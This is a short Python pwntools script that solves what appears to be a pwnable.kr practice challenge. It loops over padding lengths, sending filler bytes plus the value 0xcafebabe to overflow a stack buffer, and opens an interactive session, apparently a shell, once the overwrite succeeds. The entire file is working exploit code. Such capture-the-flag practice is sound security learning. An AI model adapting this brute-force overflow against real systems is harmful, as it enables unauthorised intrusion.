import struct
from pwn import *

key = struct.pack( '<I', 0xcafebabe )

for i in range(32,100):
	print i
	r = remote( 'pwnable.kr', 9000 )
	r.sendline( 'a' *  i + key )
	response = r.recv(4096, timeout=1)
	if ( response == '' ):
		r.interactive()
		break
	else:
		r.close()
